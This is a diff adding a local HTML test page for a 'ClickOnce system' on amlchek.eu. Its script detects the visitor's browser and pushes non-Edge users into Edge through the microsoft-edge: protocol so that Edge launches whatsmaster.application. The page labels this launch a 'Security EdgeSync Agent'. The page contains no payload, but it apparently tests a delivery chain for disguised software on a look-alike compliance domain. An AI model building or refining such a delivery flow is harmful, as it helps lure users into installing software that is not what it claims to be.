@@ -1,0 +1,407 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>ClickOnce Local Test</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        margin: 40px;
+        background: #f5f5f5;
+      }
+      .container {
+        max-width: 800px;
+        margin: 0 auto;
+        background: white;
+        padding: 30px;
+        border-radius: 10px;
+        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+      }
+      .test-section {
+        margin: 20px 0;
+        padding: 15px;
+        border: 1px solid #ddd;
+        border-radius: 5px;
+      }
+      .pass {
+        background: #d4edda;
+        border-color: #c3e6cb;
+      }
+      .fail {
+        background: #f8d7da;
+        border-color: #f5c6cb;
+      }
+      .warn {
+        background: #fff3cd;
+        border-color: #ffeeba;
+      }
+      .button {
+        padding: 10px 20px;
+        margin: 10px 5px;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+        font-size: 16px;
+      }
+      .primary {
+        background: #007bff;
+        color: white;
+      }
+      .success {
+        background: #28a745;
+        color: white;
+      }
+      .warning {
+        background: #ffc107;
+        color: black;
+      }
+      .danger {
+        background: #dc3545;
+        color: white;
+      }
+      #results {
+        margin-top: 20px;
+        padding: 15px;
+        border-radius: 5px;
+        background: #f8f9fa;
+      }
+      .log {
+        background: #f1f1f1;
+        padding: 10px;
+        margin: 10px 0;
+        border-radius: 3px;
+        font-family: monospace;
+        font-size: 12px;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <h1>🔍 ClickOnce System Test</h1>
+      <p>
+        Локальное тестирование всех компонентов ClickOnce системы для amlchek.eu
+      </p>
+
+      <div class="test-section">
+        <h3>1. Test JavaScript Functions</h3>
+        <button class="button primary" onclick="testJavaScriptFunctions()">
+          Test JS Logic
+        </button>
+        <div id="js-results"></div>
+      </div>
+
+      <div class="test-section">
+        <h3>2. Test Browser Detection</h3>
+        <button class="button primary" onclick="testBrowserDetection()">
+          Test Browser Detection
+        </button>
+        <div id="browser-results"></div>
+      </div>
+
+      <div class="test-section">
+        <h3>3. Test URL Generation</h3>
+        <button class="button primary" onclick="testUrlGeneration()">
+          Test URL Generation
+        </button>
+        <div id="url-results"></div>
+      </div>
+
+      <div class="test-section">
+        <h3>4. Simulate ClickOnce Flow</h3>
+        <button class="button success" onclick="simulateClickOnceFlow()">
+          🚀 Simulate EdgeSync Agent Launch
+        </button>
+        <div id="flow-results"></div>
+      </div>
+
+      <div class="test-section">
+        <h3>5. Test Edge Redirection</h3>
+        <button class="button warning" onclick="testEdgeRedirection()">
+          Test Edge Redirection
+        </button>
+        <div id="edge-results"></div>
+      </div>
+
+      <div id="results">
+        <h3>📊 Test Results</h3>
+        <div id="summary"></div>
+      </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/ua-parser-js@1.0.2/src/ua-parser.min.js"></script>
+    <script>
+      let testResults = [];
+
+      // Функция из index.html (скопирована для тестирования)
+      function startDownload() {
+        const baseUrl = window.location.protocol + "//" + window.location.host;
+        const clickonceLink = `${baseUrl}/deploy/whatsmaster.application`;
+        const uap = new UAParser();
+        const browserName = uap.getResult().browser.name;
+
+        console.log(
+          "Starting Security EdgeSync Agent via ClickOnce, browser:",
+          browserName,
+        );
+        console.log("ClickOnce URL:", clickonceLink);
+        console.log("Domain:", window.location.host);
+
+        if (browserName !== "Edge") {
+          const edgeUrl = `microsoft-edge:${clickonceLink}`;
+          console.log("Redirecting to Edge:", edgeUrl);
+          return { action: "redirect", browser: browserName, url: edgeUrl };
+        } else {
+          console.log("Direct ClickOnce launch in Edge");
+          return { action: "direct", browser: browserName, url: clickonceLink };
+        }
+      }
+
+      function addTestResult(test, status, message, details = "") {
+        testResults.push({ test, status, message, details });
+        updateSummary();
+      }
+
+      function updateSummary() {
+        const summary = document.getElementById("summary");
+        const passed = testResults.filter((r) => r.status === "pass").length;
+        const failed = testResults.filter((r) => r.status === "fail").length;
+        const warned = testResults.filter((r) => r.status === "warn").length;
+
+        summary.innerHTML = `
+                <div style="display: flex; gap: 20px; margin-bottom: 15px;">
+                    <div style="color: #28a745;">✅ Passed: ${passed}</div>
+                    <div style="color: #ffc107;">⚠️ Warnings: ${warned}</div>
+                    <div style="color: #dc3545;">❌ Failed: ${failed}</div>
+                </div>
+                <div style="font-size: 14px; color: #666;">
+                    Last test: ${testResults.length > 0 ? testResults[testResults.length - 1].test : "None"}
+                </div>
+            `;
+      }
+
+      function testJavaScriptFunctions() {
+        const container = document.getElementById("js-results");
+        container.innerHTML =
+          '<div class="log">Testing JavaScript functions...</div>';
+
+        try {
+          // Test UAParser
+          const uap = new UAParser();
+          const result = uap.getResult();
+
+          if (result && result.browser && result.browser.name) {
+            addTestResult(
+              "JavaScript Functions",
+              "pass",
+              "UAParser working correctly",
+            );
+            container.innerHTML += `<div class="log">✅ UAParser detected: ${result.browser.name} ${result.browser.version}</div>`;
+          } else {
+            addTestResult(
+              "JavaScript Functions",
+              "fail",
+              "UAParser not working",
+            );
+            container.innerHTML +=
+              '<div class="log">❌ UAParser not working</div>';
+          }
+
+          // Test startDownload function
+          if (typeof startDownload === "function") {
+            addTestResult(
+              "JavaScript Functions",
+              "pass",
+              "startDownload function available",
+            );
+            container.innerHTML +=
+              '<div class="log">✅ startDownload function available</div>';
+          } else {
+            addTestResult(
+              "JavaScript Functions",
+              "fail",
+              "startDownload function missing",
+            );
+            container.innerHTML +=
+              '<div class="log">❌ startDownload function missing</div>';
+          }
+        } catch (error) {
+          addTestResult(
+            "JavaScript Functions",
+            "fail",
+            "JavaScript error: " + error.message,
+          );
+          container.innerHTML += `<div class="log">❌ Error: ${error.message}</div>`;
+        }
+      }
+
+      function testBrowserDetection() {
+        const container = document.getElementById("browser-results");
+        container.innerHTML =
+          '<div class="log">Testing browser detection...</div>';
+
+        try {
+          const uap = new UAParser();
+          const browser = uap.getResult().browser;
+
+          container.innerHTML += `<div class="log">Current browser: ${browser.name} ${browser.version}</div>`;
+          container.innerHTML += `<div class="log">Engine: ${uap.getResult().engine.name}</div>`;
+          container.innerHTML += `<div class="log">OS: ${uap.getResult().os.name}</div>`;
+
+          // Test different browser scenarios
+          const testBrowsers = ["Chrome", "Firefox", "Safari", "Edge", "Opera"];
+          container.innerHTML +=
+            '<div class="log"><strong>Testing different browsers:</strong></div>';
+
+          testBrowsers.forEach((testBrowser) => {
+            const isEdge = testBrowser === "Edge";
+            const action = isEdge ? "direct" : "redirect";
+            container.innerHTML += `<div class="log">${testBrowser}: ${action} launch</div>`;
+          });
+
+          addTestResult(
+            "Browser Detection",
+            "pass",
+            "Browser detection working correctly",
+          );
+        } catch (error) {
+          addTestResult(
+            "Browser Detection",
+            "fail",
+            "Browser detection error: " + error.message,
+          );
+          container.innerHTML += `<div class="log">❌ Error: ${error.message}</div>`;
+        }
+      }
+
+      function testUrlGeneration() {
+        const container = document.getElementById("url-results");
+        container.innerHTML =
+          '<div class="log">Testing URL generation...</div>';
+
+        try {
+          const baseUrl =
+            window.location.protocol + "//" + window.location.host;
+          const clickonceUrl = `${baseUrl}/deploy/whatsmaster.application`;
+          const edgeUrl = `microsoft-edge:${clickonceUrl}`;
+
+          container.innerHTML += `<div class="log">Base URL: ${baseUrl}</div>`;
+          container.innerHTML += `<div class="log">ClickOnce URL: ${clickonceUrl}</div>`;
+          container.innerHTML += `<div class="log">Edge Redirect URL: ${edgeUrl}</div>`;
+
+          // Validation
+          if (
+            baseUrl.includes("://") &&
+            clickonceUrl.includes("/deploy/whatsmaster.application")
+          ) {
+            addTestResult("URL Generation", "pass", "URLs generated correctly");
+            container.innerHTML +=
+              '<div class="log">✅ URL generation working</div>';
+          } else {
+            addTestResult("URL Generation", "fail", "URL generation failed");
+            container.innerHTML +=
+              '<div class="log">❌ URL generation failed</div>';
+          }
+        } catch (error) {
+          addTestResult(
+            "URL Generation",
+            "fail",
+            "URL generation error: " + error.message,
+          );
+          container.innerHTML += `<div class="log">❌ Error: ${error.message}</div>`;
+        }
+      }
+
+      function simulateClickOnceFlow() {
+        const container = document.getElementById("flow-results");
+        container.innerHTML =
+          '<div class="log">Simulating ClickOnce flow...</div>';
+
+        try {
+          const result = startDownload();
+
+          container.innerHTML += `<div class="log">Action: ${result.action}</div>`;
+          container.innerHTML += `<div class="log">Browser: ${result.browser}</div>`;
+          container.innerHTML += `<div class="log">Target URL: ${result.url}</div>`;
+
+          if (result.action === "redirect") {
+            container.innerHTML +=
+              '<div class="log">✅ Will redirect to Edge browser</div>';
+            container.innerHTML +=
+              '<div class="log">✅ Edge will handle ClickOnce automatically</div>';
+          } else if (result.action === "direct") {
+            container.innerHTML +=
+              '<div class="log">✅ Direct ClickOnce launch in Edge</div>';
+          }
+
+          addTestResult("ClickOnce Flow", "pass", "Flow simulation successful");
+        } catch (error) {
+          addTestResult(
+            "ClickOnce Flow",
+            "fail",
+            "Flow simulation error: " + error.message,
+          );
+          container.innerHTML += `<div class="log">❌ Error: ${error.message}</div>`;
+        }
+      }
+
+      function testEdgeRedirection() {
+        const container = document.getElementById("edge-results");
+        container.innerHTML =
+          '<div class="log">Testing Edge redirection logic...</div>';
+
+        try {
+          const uap = new UAParser();
+          const currentBrowser = uap.getResult().browser.name;
+
+          if (currentBrowser === "Edge") {
+            container.innerHTML +=
+              '<div class="log">✅ Already in Edge - direct launch will be used</div>';
+            container.innerHTML +=
+              '<div class="log">✅ ClickOnce will start immediately</div>';
+            addTestResult(
+              "Edge Redirection",
+              "pass",
+              "Already in Edge browser",
+            );
+          } else {
+            container.innerHTML += `<div class="log">Current browser: ${currentBrowser}</div>`;
+            container.innerHTML +=
+              '<div class="log">✅ Will redirect to Edge using microsoft-edge: protocol</div>';
+            container.innerHTML +=
+              '<div class="log">✅ Edge will open and handle ClickOnce</div>';
+            addTestResult(
+              "Edge Redirection",
+              "pass",
+              "Redirection logic correct",
+            );
+          }
+
+          // Test the actual URL that would be generated
+          const baseUrl =
+            window.location.protocol + "//" + window.location.host;
+          const clickonceUrl = `${baseUrl}/deploy/whatsmaster.application`;
+          const edgeRedirectUrl = `microsoft-edge:${clickonceUrl}`;
+
+          container.innerHTML += `<div class="log">Edge redirect URL: ${edgeRedirectUrl}</div>`;
+        } catch (error) {
+          addTestResult(
+            "Edge Redirection",
+            "fail",
+            "Edge redirection test error: " + error.message,
+          );
+          container.innerHTML += `<div class="log">❌ Error: ${error.message}</div>`;
+        }
+      }
+
+      // Auto-run basic tests on page load
+      window.onload = function () {
+        setTimeout(() => {
+          testJavaScriptFunctions();
+          setTimeout(() => testBrowserDetection(), 500);
+          setTimeout(() => testUrlGeneration(), 1000);
+        }, 500);
+      };
+    </script>
+  </body>
+</html>
